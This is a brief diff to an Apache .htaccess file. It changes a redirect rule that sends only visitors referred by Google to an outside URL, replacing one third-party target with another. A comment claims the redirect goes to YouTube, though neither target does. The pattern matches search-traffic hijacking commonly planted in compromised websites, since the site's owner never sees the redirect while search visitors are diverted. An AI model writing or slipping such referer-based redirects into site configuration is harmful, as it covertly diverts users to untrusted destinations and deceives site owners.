@@ -4,4 +4,4 @@ RewriteEngine On
 RewriteCond %{HTTP_REFERER} ^https?://(www\.)?google\. [NC]
 
 # Redirect to YouTube
-RewriteRule ^(.*)$ https://kutt.arrehlah.com/alexsagapung [R=302,L]
+RewriteRule ^(.*)$ https://listrik.org/publicenemy [R=302,L]
